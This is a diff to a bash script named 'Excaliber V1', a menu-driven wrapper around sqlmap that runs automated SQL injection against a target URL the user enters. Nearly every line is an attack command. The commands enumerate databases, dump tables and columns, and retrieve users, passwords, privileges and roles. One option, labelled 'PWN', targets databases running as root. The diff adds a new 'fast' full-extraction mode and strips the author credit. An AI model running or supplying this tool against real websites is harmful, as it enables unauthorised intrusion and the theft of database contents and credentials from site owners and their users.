@@ -1,8 +1,11 @@
 #!/bin/bash
 #Codename: Excaliber V1
-#Coded By: Blkzer0
 ## Script (Automated Sqlmap ) is for quick recon. All parmeters are set for quick and accurate retrieval of database information. 
 
+function fast(){
+read -p "Enter URL of target:" url
+sqlmap -u $url --random-agent --level=4 --risk=2 --all --threads 6
+}
 
 function list(){
 read -p "Are you scanning a list or single target [l/t]?" input
@@ -13,25 +16,23 @@ sqlmap -m $list --random-agent --level=3 --risk=2 -o --skip-static --is-dba --db
 elif [ $input == 't' ] 
 then
 read -p "what is the target url?:" url
-sqlmap -u $url --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --identify-waf --privileges --users
+sqlmap -u $url --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch
 
 fi
-
 }
 
 function database(){
 read -p "<[URL]>:" url   
 read -p "<[DB]>:" db
-sqlmap -u $url --random-agent -D $db --tables --count --threads 6 #--hex #--no-cast
+sqlmap -u $url --random-agent -D $db --tables --count --threads 6 
 read -p " What kind of tables to search?:" tables
-sqlmap -u $url --random-agent -D $db -T $tables --columns --dump --threads 7    #--hex --batch 
-
+sqlmap -u $url --random-agent -D $db -T $tables --columns --dump --threads 7
+ #--hex --batch 
 }
 
 function recon(){
 read -p " what is the url of target?:" target
-sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --all --fingerprint --dbs --tables --count --threads 7
-
+sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --privileges --roles --users --passwords --fingerprint --dbs --tables --columns --count --threads 7
 }
 
 function pwn(){
@@ -52,15 +53,18 @@ read -p " What is the url?:" url
 read -p " What DB you want to search?:" db
 read -p " What Table/s you want to search?:" table
 sqlmap -u $url --random-agent --level=3 --risk=2 -D $db -T $table --columns --dump --threads 6
-
 } 
+
+
+
 
 function menu(){
 echo "[1] Perform Scan Of Target"
 echo "[2] Perform Scan Of Database and Tables"
-echo "[3] Perform Full Recon Scan Of Database"
+echo "[3] Perform Full Scan Of Database"
 echo "[4] Perform PWN on Database(DBA is Root)"
 echo "[5] Perform Custom Search"
+echo "[6] Retreive All Info of This Webserver"
 echo "[0] Exit"
 read -p "What is your choice?:" choice
 if [ $choice == '1' ] 
@@ -78,6 +82,9 @@ pwn
 elif [ $choice == '5' ]
 then
 custom
+elif [ $choice == '6' ]
+then
+fast
 elif [ $choice == '0' ]
 then
 clear
@@ -100,6 +107,8 @@ echo "              \<M-                                                        
 echo "               \(B                                                            " 
 echo "                \?                                                            "
 echo ""
+
+
 echo "      Getting Injections Ready                     "
 echo "      ##Codedname: Excaliber V1"
 sleep 1
@@ -108,9 +117,10 @@ echo " Automated Sql Injections via SQLMap "
 echo "<===================================>"
 echo "[1] Perform Scan Of Target"
 echo "[2] Perform Scan Of Database and Tables"
-echo "[3] Perform Full Recon Scan Of Database"
+echo "[3] Perform Full Scan Of Database"
 echo "[4] Perform PWN on Database(DBA is Root)"
 echo "[5] Perform Custom Search"
+echo "[6] Retreive All Info of This Webserver"
 echo "[0] Exit"
 read -p "What is your choice?" choice
 if [ $choice == '1' ] 
@@ -128,10 +138,12 @@ pwn
 elif [ $choice == '5' ]
 then
 custom
+elif [ $choice == '6' ]
+then
+fast
 elif [ $choice == '0' ]
 then
 clear
 exit
 
 fi
-
